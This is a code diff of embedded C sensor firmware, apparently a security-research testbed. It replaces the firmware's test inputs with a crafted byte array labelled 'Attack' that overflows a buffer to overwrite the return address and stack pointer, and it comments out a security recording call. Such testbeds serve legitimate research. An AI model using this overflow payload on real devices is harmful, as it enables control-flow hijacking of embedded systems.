@@ -1153,19 +1153,13 @@ void application(){
 #define cmd_temp_hum        't'
 #define cmd_all             'a'
 
-// Ultrasonic only
+/** Benign: calls Ultrasonic only **/
 // char input[4] = {'u', 0, 16, ':'};
-// Temperature and humidity
-// uint8_t input[4] = {'t', 0, 2, ':'};
-// All
-// char input[13] = {'a', 0, 1, 'u', 0, 16, 't', 0, 2, 'h', 0, 2, ':'};
-// Attack -- an "all" request modified to run only ultrasonic 
-// overwrites: return address to 0x804077e, stack pointer to 0x2003ffe8                                                 8040812 
-// char input[25] = {'a', 0, 1, 'u', 0, 16, 't', 0, 2, 'h', 0, 2, 'a','a','a','a', 0xe8, 0xff, 0x03, 0x20, 0x13, 0x08, 0x04, 0x08, ':'};
-//                                                                                                                                                             8040694+1
-//                                                                                                                                                             80405ce+1
-char input[33] = {'b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b', 0xf0, 0xff, 0x03, 0x20, 0xcf, 0x05, 0x04, 0x08, ':'};
-
+//
+/** Attack: overwrites return address and stack pointer to cause infinite loop in process_command function **/
+//
+char input[33] = {'b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b',0xb4,0x06,0x04,0x08, 0xf0, 0xff, 0x03, 0x20, 0xb9, 0x05, 0x04, 0x08, ':'};
+//
 uint32_t data[4] = {0,0,0,0};
 uint8_t temp_data[5] = {0,0,0,0,0};
 uint8_t valid_reading = 0;
@@ -1347,7 +1341,7 @@ void process_command(){
             break;
     }
     cmd = msg[0];
-    SECURE_record_output_data(cmd);
+    // SECURE_record_output_data(cmd);
     // return msg[0];
 }
 
